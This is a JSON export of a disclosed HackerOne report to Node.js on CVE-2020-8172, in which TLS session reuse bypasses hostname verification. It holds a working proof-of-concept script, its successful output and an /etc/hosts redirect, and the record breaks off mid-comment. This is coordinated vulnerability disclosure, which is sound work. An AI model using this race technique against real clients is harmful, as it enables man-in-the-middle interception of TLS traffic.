{"id":811502,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MTE1MDI=","url":"https://hackerone.com/reports/811502","title":"Node.js: TLS session reuse can lead to hostname verification bypass","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-03-05T17:30:12.121Z","submitted_at":"2020-03-05T17:30:12.121Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"fwilhelm","url":"/fwilhelm","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22984,"url":"https://hackerone.com/nodejs","handle":"nodejs","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js","twitter_handle":"nodejs","website":"https://nodejs.org","about":"The Node.js JavaScript Runtime"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8172"],"singular_disclosure_disabled":false,"disclosed_at":"2020-06-03T06:55:54.149Z","bug_reporter_agreed_on_going_public_at":"2020-06-03T06:55:54.061Z","team_member_agreed_on_going_public_at":"2020-06-02T19:56:09.884Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The Node.js TLS library supports client side reuse of TLS sessions when multiple connections to the same server are opened.\n\nCode that wants to use this feature can listen for the 'session' event (https://nodejs.org/api/tls.html#tls_event_session) on a tls.TLSSocket to get notified of newly created TLS sessions. The documentation for this event explicitly mentions that the passed sessions \"can be used immediately or later\".\n\nThe problem with this design is that 'session' events are triggered even if verification of the server certificate hostname in onConnectSecure fails. (https://github.com/nodejs/node/blob/b1d4c13430c92e94920f0c8c9ba1295c075c9e89/lib/_tls_wrap.js#L1502):\n\nonConnectSecure is triggered by the OpenSSL info callback (with the flag SSL_CB_HANDSHAKE_DONE) after a TLS handshake. The 'session' event is triggered by OpenSSLs get_session_cb, which can happen before the info callback in TLS 1.2 and after in TLS 1.3 and which is triggered regardless of the result of onConnectSecure.\n\nThis means that sessions where the server presented an invalid certificate, or one with a wrong hostname, will trigger the session event and can end up being reused or stored in a cache.\n\nThat behavior is insecure, because resumed sessions will not be subjected to another hostname verification check as long as they are CA signed:\n\n// Verify that server's identity matches it's certificate's names\n// Unless server has resumed our existing session\nif (!verifyError \u0026\u0026 !this.isSessionReused()) {\n    const hostname = options.servername ||\n                   options.host ||\n                   (options.socket \u0026\u0026 options.socket._host) ||\n                   'localhost';\n    const cert = this.getPeerCertificate(true);\n    verifyError = options.checkServerIdentity(hostname, cert);\n}\n\n\nIn practice, this means that the immediate reuse described in the API documentation is always insecure and that session caches are at risk of storing insecure sessions. The most important implementation of a session cache is in the https library (https://github.com/nodejs/node/blob/b1d4c13430c92e94920f0c8c9ba1295c075c9e89/lib/https.js#L130): New sessions are stored in the cache when the ‘session’ event is triggered and are evicted once a tls socket is closed with an error. \n\n if (options._agentKey) {\n    // Cache new session for reuse\n    socket.on('session', (session) =\u003e {\n      this._cacheSession(options._agentKey, session);\n    });\n\n    // Evict session on error\n    socket.once('close', (err) =\u003e {\n      if (err)\n        this._evictSession(options._agentKey);\n    });\n  }\n\nThis opens a small race window where an invalid session can be used by other HTTPs requests to the same host. The attached proof-of-concept wins the race reliably against a local server using a setImmediate() callback, but there are probably other ways this could be exploited in real world applications. I also did not fully investigate if there is a way to trigger the socket ‘close’ event with no error which would skip the session eviction and turn this into a 100% reliable bypass.\n\n\nThe POC requires a target server with a valid CA signed certificate (for an arbitrary hostname) and support for TLS resumption. I’ve attached a minimal golang https server that worked for me.\n\n[fwilhelm@fwilhelm node]$ ../node/node-v13.9.0-linux-x64/bin/node poc.js\n[!] First request failed:Host: nodejs.org. is not in the cert's altnames: DNS:loca.host\n[x] Starting second request\n[x] Dumping globalAgent._sessionCache.map:\n{\n  'nodejs.org:8444:::::::::::::::::TLSv1_2_method:': \u003cBuffer 30 82 06 2f 02 01 01 02 02 03 04 04 02 13 01 04 20 cd b7 17 84 ac 9f 31 6f 1c cc 73 de 31 05 eb dc 60 62 df c7 c5 d5 8c b4 75 cc a7 28 1f d9 c0 22 04 ... 1537 more bytes\u003e\n}\n[!] Bypassed hostname verification. Server response: 200\n{\n  date: 'Thu, 05 Mar 2020 17:08:24 GMT',\n  'content-length': '29',\n  'content-type': 'text/plain; charset=utf-8',\n  connection: 'close'\n}\n\n\nThis bug is subject to a 90 day disclosure deadline. After 90 days elapse,\nthe bug report will become visible to the public. The scheduled disclosure\ndate is 2020-06-03. Disclosure at an earlier date is also possible if\nagreed upon by all parties.\n\n## Impact\n\nMitM of TLS connections","vulnerability_information_html":"\u003cp\u003eThe Node.js TLS library supports client side reuse of TLS sessions when multiple connections to the same server are opened.\u003c/p\u003e\n\n\u003cp\u003eCode that wants to use this feature can listen for the \u0026#39;session\u0026#39; event (\u003ca title=\"https://nodejs.org/api/tls.html#tls_event_session\" href=\"/redirect?url=https%3A%2F%2Fnodejs.org%2Fapi%2Ftls.html%23tls_event_session\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://nodejs.org/api/tls.html#tls_event_session\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) on a tls.TLSSocket to get notified of newly created TLS sessions. The documentation for this event explicitly mentions that the passed sessions \u0026quot;can be used immediately or later\u0026quot;.\u003c/p\u003e\n\n\u003cp\u003eThe problem with this design is that \u0026#39;session\u0026#39; events are triggered even if verification of the server certificate hostname in onConnectSecure fails. (\u003ca title=\"https://github.com/nodejs/node/blob/b1d4c13430c92e94920f0c8c9ba1295c075c9e89/lib/_tls_wrap.js#L1502):\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnodejs%2Fnode%2Fblob%2Fb1d4c13430c92e94920f0c8c9ba1295c075c9e89%2Flib%2F_tls_wrap.js%23L1502%29%3A\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nodejs/node/blob/b1d4c13430c92e94920f0c8c9ba1295c075c9e89/lib/_tls_wrap.js#L1502):\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eonConnectSecure is triggered by the OpenSSL info callback (with the flag SSL_CB_HANDSHAKE_DONE) after a TLS handshake. The \u0026#39;session\u0026#39; event is triggered by OpenSSLs get_session_cb, which can happen before the info callback in TLS 1.2 and after in TLS 1.3 and which is triggered regardless of the result of onConnectSecure.\u003c/p\u003e\n\n\u003cp\u003eThis means that sessions where the server presented an invalid certificate, or one with a wrong hostname, will trigger the session event and can end up being reused or stored in a cache.\u003c/p\u003e\n\n\u003cp\u003eThat behavior is insecure, because resumed sessions will not be subjected to another hostname verification check as long as they are CA signed:\u003c/p\u003e\n\n\u003cp\u003e// Verify that server\u0026#39;s identity matches it\u0026#39;s certificate\u0026#39;s names\u003cbr\u003e\n// Unless server has resumed our existing session\u003cbr\u003e\nif (!verifyError \u0026amp;\u0026amp; !this.isSessionReused()) {\u003cbr\u003e\n    const hostname = options.servername ||\u003cbr\u003e\n                   options.host ||\u003cbr\u003e\n                   (options.socket \u0026amp;\u0026amp; options.socket._host) ||\u003cbr\u003e\n                   \u0026#39;localhost\u0026#39;;\u003cbr\u003e\n    const cert = this.getPeerCertificate(true);\u003cbr\u003e\n    verifyError = options.checkServerIdentity(hostname, cert);\u003cbr\u003e\n}\u003c/p\u003e\n\n\u003cp\u003eIn practice, this means that the immediate reuse described in the API documentation is always insecure and that session caches are at risk of storing insecure sessions. The most important implementation of a session cache is in the https library (\u003ca title=\"https://github.com/nodejs/node/blob/b1d4c13430c92e94920f0c8c9ba1295c075c9e89/lib/https.js#L130):\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnodejs%2Fnode%2Fblob%2Fb1d4c13430c92e94920f0c8c9ba1295c075c9e89%2Flib%2Fhttps.js%23L130%29%3A\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nodejs/node/blob/b1d4c13430c92e94920f0c8c9ba1295c075c9e89/lib/https.js#L130):\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e New sessions are stored in the cache when the ‘session’ event is triggered and are evicted once a tls socket is closed with an error. \u003c/p\u003e\n\n\u003cp\u003eif (options._agentKey) {\u003cbr\u003e\n    // Cache new session for reuse\u003cbr\u003e\n    socket.on(\u0026#39;session\u0026#39;, (session) =\u0026gt; {\u003cbr\u003e\n      this._cacheSession(options._agentKey, session);\u003cbr\u003e\n    });\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e// Evict session on error\nsocket.once(\u0026#39;close\u0026#39;, (err) =\u0026gt; {\n  if (err)\n    this._evictSession(options._agentKey);\n});\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e}\u003c/p\u003e\n\n\u003cp\u003eThis opens a small race window where an invalid session can be used by other HTTPs requests to the same host. The attached proof-of-concept wins the race reliably against a local server using a setImmediate() callback, but there are probably other ways this could be exploited in real world applications. I also did not fully investigate if there is a way to trigger the socket ‘close’ event with no error which would skip the session eviction and turn this into a 100% reliable bypass.\u003c/p\u003e\n\n\u003cp\u003eThe POC requires a target server with a valid CA signed certificate (for an arbitrary hostname) and support for TLS resumption. I’ve attached a minimal golang https server that worked for me.\u003c/p\u003e\n\n\u003cp\u003e[fwilhelm@fwilhelm node]$ ../node/node-v13.9.0-linux-x64/bin/node poc.js\u003cbr\u003e\n[!] First request failed:Host: nodejs.org. is not in the cert\u0026#39;s altnames: DNS:loca.host\u003cbr\u003e\n[x] Starting second request\u003cbr\u003e\n[x] Dumping globalAgent._sessionCache.map:\u003cbr\u003e\n{\u003cbr\u003e\n  \u0026#39;nodejs.org:8444:::::::::::::::::TLSv1_2_method:\u0026#39;: \u0026lt;Buffer 30 82 06 2f 02 01 01 02 02 03 04 04 02 13 01 04 20 cd b7 17 84 ac 9f 31 6f 1c cc 73 de 31 05 eb dc 60 62 df c7 c5 d5 8c b4 75 cc a7 28 1f d9 c0 22 04 ... 1537 more bytes\u0026gt;\u003cbr\u003e\n}\u003cbr\u003e\n[!] Bypassed hostname verification. Server response: 200\u003cbr\u003e\n{\u003cbr\u003e\n  date: \u0026#39;Thu, 05 Mar 2020 17:08:24 GMT\u0026#39;,\u003cbr\u003e\n  \u0026#39;content-length\u0026#39;: \u0026#39;29\u0026#39;,\u003cbr\u003e\n  \u0026#39;content-type\u0026#39;: \u0026#39;text/plain; charset=utf-8\u0026#39;,\u003cbr\u003e\n  connection: \u0026#39;close\u0026#39;\u003cbr\u003e\n}\u003c/p\u003e\n\n\u003cp\u003eThis bug is subject to a 90 day disclosure deadline. After 90 days elapse,\u003cbr\u003e\nthe bug report will become visible to the public. The scheduled disclosure\u003cbr\u003e\ndate is 2020-06-03. Disclosure at an earlier date is also possible if\u003cbr\u003e\nagreed upon by all parties.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eMitM of TLS connections\u003c/p\u003e\n","bounty_amount":"250.0","formatted_bounty":"$250","weakness":{"id":30,"name":"Man-in-the-Middle"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":738445,"file_name":"poc.js","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uqAkxkaS455TMvyuZDZsFsbj?response-content-disposition=attachment%3B%20filename%3D%22poc.js%22%3B%20filename%2A%3DUTF-8%27%27poc.js\u0026response-content-type=text%2Fx-csrc\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065704Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=df65fbf060ec6ad1fe0d221658ff7080b8fc6236593afd9234c014073df012ef","file_size":1306,"type":"text/x-csrc"},{"id":738446,"file_name":"server.go","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iui2p9QppaMricghDmnBsbs3?response-content-disposition=attachment%3B%20filename%3D%22server.go%22%3B%20filename%2A%3DUTF-8%27%27server.go\u0026response-content-type=text%2Fx-go\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065704Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=3f9bef49bdb68f45ab53695d142632e57a72c1ae302cfe5473d60f0ff057d1b3","file_size":566,"type":"text/x-go"}],"allow_singular_disclosure_at":"2020-07-02T19:56:09.965Z","allow_singular_disclosure_after":-15505254.881957289,"singular_disclosure_allowed":true,"vote_count":26,"voters":["brahim_boufakri01","prinzhorn","khizer47","b69fb2ebda43240ece9dbeb","dhiral","sebtom","wh0th3h3llam1","aru-hackz","d3_w4lk3r","meispi","and 16 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":666,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/nodejs/node","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7239077,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello!\n\nThank you for the report and your research.\n\nCould you advise us which Node.js version did you find vulnerable to this? I've tried to reproduce it on v12.13.1, but it just doesn't seem to work.\n\nIs it important to use `go` server for reproduction?","markdown_message":"\u003cp\u003eHello!\u003c/p\u003e\n\n\u003cp\u003eThank you for the report and your research.\u003c/p\u003e\n\n\u003cp\u003eCould you advise us which Node.js version did you find vulnerable to this? I\u0026#39;ve tried to reproduce it on v12.13.1, but it just doesn\u0026#39;t seem to work.\u003c/p\u003e\n\n\u003cp\u003eIs it important to use \u003ccode\u003ego\u003c/code\u003e server for reproduction?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-06T02:35:03.599Z","updated_at":"2020-03-06T02:35:03.599Z","actor":{"username":"indutny","cleared":false,"url":"/indutny","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7240177,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey,\n\nI've tested this with v13.9.0 (which was current when I started looking into this). \n\nIt is important that the repro server runs locally (otherwise the timing is probably wrong) and that it supports session resumption for TLS 1.2 (go does that out of the box, I believe node requires configuring a session store). Other than that there is nothing special about the go server.\n\nCould you paste the script output that you are seeing?","markdown_message":"\u003cp\u003eHey,\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve tested this with v13.9.0 (which was current when I started looking into this). \u003c/p\u003e\n\n\u003cp\u003eIt is important that the repro server runs locally (otherwise the timing is probably wrong) and that it supports session resumption for TLS 1.2 (go does that out of the box, I believe node requires configuring a session store). Other than that there is nothing special about the go server.\u003c/p\u003e\n\n\u003cp\u003eCould you paste the script output that you are seeing?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-06T06:57:22.831Z","updated_at":"2020-03-06T06:57:22.831Z","actor":{"username":"fwilhelm","cleared":false,"url":"/fwilhelm","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7242329,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @fwilhelm,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@beagle ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/fwilhelm\"\u003e@fwilhelm\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-06T10:41:29.657Z","updated_at":"2020-03-06T10:41:29.657Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7242915,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nKind regards,\n@beagle  ","markdown_message":"\u003cp\u003eI was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e  \u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-06T12:14:20.483Z","updated_at":"2020-03-06T12:14:20.483Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7349689,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can reproduce the issue now using updated `poc.js`:\n\n```\n// echo '127.0.0.1 nodejs.org' \u003e\u003e /etc/hosts\n// run an https server on localhost:8444 \n// serving an CA signed cert for an arbitrary domain\n//\n// ./node-v13.9.0-linux-x64/bin/node poc.js\n\nconst https = require('https');\n\nconst options = {\n  hostname: 'kubernetes.docker.internal',\n  port: 8444,\n  path: '/hello',\n  method: 'GET',\n  // note that this is not required for the bug to work but it makes reproducing it easier.\n  secureProtocol: 'TLSv1_2_method'\n};\n\n\nconst req = https.request(options, (res) =\u003e {\n  res.on('data', (d) =\u003e {\n    assert(0, \"First request should always fail in a correct setup\")\n  });\n});\n\nreq.on('error', (e) =\u003e {\n  console.log(\"[!] First request failed:\" + e.reason);\n  setImmediate(() =\u003e { doit() });\n});\nreq.end();\n\n\nfunction doit() {\n  console.log(\"[x] Starting second request\");\n  console.log(\"[x] Dumping globalAgent._sessionCache.map:\")\n  console.log(https.globalAgent._sessionCache.map)\n\n  const req2 = https.request(options, (res) =\u003e {\n    res.on('data', (d) =\u003e {\n      console.log(\"[!] Bypassed hostname verification. Server response: \" + res.statusCode)\n      console.log(res.headers)\n      process.stdout.write(d);\n      process.exit(1);\n    });\n  });\n\n  req2.on('error', (e) =\u003e {\n    console.log(\"[-] Second request failed:\" + e);\n    console.log(\"[-] Race failed or not vulnerable.\")\n    process.exit(0);\n  });\n  req2.end();\n\n\n}\n```\n\nNote the `secureProtocol` option above. The session management is different for TLS1.3 so it is indeed necessary to force it down to at least 1.2 to reproduce the issue.","markdown_message":"\u003cp\u003eI can reproduce the issue now using updated \u003ccode\u003epoc.js\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e// echo \u0026#39;127.0.0.1 nodejs.org\u0026#39; \u0026gt;\u0026gt; /etc/hosts\n// run an https server on localhost:8444 \n// serving an CA signed cert for an arbitrary domain\n//\n// ./node-v13.9.0-linux-x64/bin/node poc.js\n\nconst https = require(\u0026#39;https\u0026#39;);\n\nconst options = {\n  hostname: \u0026#39;kubernetes.docker.internal\u0026#39;,\n  port: 8444,\n  path: \u0026#39;/hello\u0026#39;,\n  method: \u0026#39;GET\u0026#39;,\n  // note that this is not required for the bug to work but it makes reproducing it easier.\n  secureProtocol: \u0026#39;TLSv1_2_method\u0026#39;\n};\n\n\nconst req = https.request(options, (res) =\u0026gt; {\n  res.on(\u0026#39;data\u0026#39;, (d) =\u0026gt; {\n    assert(0, \u0026quot;First request should always fail in a correct setup\u0026quot;)\n  });\n});\n\nreq.on(\u0026#39;error\u0026#39;, (e) =\u0026gt; {\n  console.log(\u0026quot;[!] First request failed:\u0026quot; + e.reason);\n  setImmediate(() =\u0026gt; { doit() });\n});\nreq.end();\n\n\nfunction doit() {\n  console.log(\u0026quot;[x] Starting second request\u0026quot;);\n  console.log(\u0026quot;[x] Dumping globalAgent._sessionCache.map:\u0026quot;)\n  console.log(https.globalAgent._sessionCache.map)\n\n  const req2 = https.request(options, (res) =\u0026gt; {\n    res.on(\u0026#39;data\u0026#39;, (d) =\u0026gt; {\n      console.log(\u0026quot;[!] Bypassed hostname verification. Server response: \u0026quot; + res.statusCode)\n      console.log(res.headers)\n      process.stdout.write(d);\n      process.exit(1);\n    });\n  });\n\n  req2.on(\u0026#39;error\u0026#39;, (e) =\u0026gt; {\n    console.log(\u0026quot;[-] Second request failed:\u0026quot; + e);\n    console.log(\u0026quot;[-] Race failed or not vulnerable.\u0026quot;)\n    process.exit(0);\n  });\n  req2.end();\n\n\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNote the \u003ccode\u003esecureProtocol\u003c/code\u003e option above. The session management is different for TLS1.3 so it is indeed necessary to force it down to at least 1.2 to reproduce the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-18T02:51:40.133Z","updated_at":"2020-03-18T02:51:40.133Z","actor":{"username":"indutny","cleared":false,"url":"/indutny","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7349874,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I have a preliminary patch that should fix the issue. Working on the test case for the Node.js test suite.\n\nSorry for the delay!","markdown_message":"\u003cp\u003eI have a preliminary patch that should fix the issue. Working on the test case for the Node.js test suite.\u003c/p\u003e\n\n\u003cp\u003eSorry for the delay!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-18T03:53:09.867Z","updated_at":"2020-03-18T03:53:09.867Z","actor":{"username":"indutny","cleared":false,"url":"/indutny","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7483793,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Fedor,\n\nI hope you are doing well. \nAny updates on this issue? Is there already an estimated date for the patch release? \nCould you send me a copy of the patch so I can take a look? (fwilhelm@google.com).\n\nThanks.\n\nBest,\nFelix ","markdown_message":"\u003cp\u003eHi Fedor,\u003c/p\u003e\n\n\u003cp\u003eI hope you are doing well. \u003cbr\u003e\nAny updates on this issue? Is there already an estimated date for the patch release? \u003cbr\u003e\nCould you send me a copy of the patch so I can take a look? (\u003ca title=\"fwilhelm@google.com\" href=\"mailto:fwilhelm@google.com\" rel=\"nofollow noopener noreferrer\"\u003efwilhelm@google.com\u003c/a\u003e).\u003c/p\u003e\n\n\u003cp\u003eThanks.\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\nFelix 